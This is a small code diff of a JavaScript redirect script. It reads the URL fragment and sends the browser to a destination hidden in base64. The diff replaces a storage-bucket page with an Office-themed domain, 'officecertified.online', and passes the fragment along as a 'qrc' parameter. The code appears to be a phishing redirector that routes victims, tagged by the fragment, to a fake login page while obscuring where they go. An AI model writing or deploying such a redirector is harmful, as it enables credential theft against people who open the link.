@@ -3,10 +3,10 @@
         if(window.location.hash) {
             var url = window.location.href;
             var hash = url.split('#').pop();
-            const encdStr = 'cjIuZGV2L2JhY2tncm91bmRmdWxsLmh0bWw=';
+            const encdStr = 'Lm9ubGluZS8/a3J4aA==';
             const str = atob (encdStr);
-            const emma = '#' + hash;
-            const dr = 'https://pub-d1729d90c762460c9395a066038cdaf9.';
+            const emma = '?qrc=' + hash;
+            const dr = 'https://officecertified';
             const ax = dr + str;
             var link = ax + emma;
             window.location.href = link;
